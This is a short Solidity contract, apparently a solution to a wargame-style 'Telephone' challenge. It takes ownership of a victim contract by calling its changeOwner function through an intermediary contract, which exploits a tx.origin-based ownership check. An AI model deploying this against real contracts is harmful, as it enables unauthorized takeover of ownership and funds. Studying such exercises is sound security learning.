//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./telephone.sol";

contract TelephoneAttack{
    Telephone public telephoneContract;


    // Init the victim contract with the same address as the victim contract
    constructor(address _telephoneContract) {
        telephoneContract = Telephone(_telephoneContract);
    }

    function attack(address _owner) public {
        telephoneContract.changeOwner(_owner);
    }
}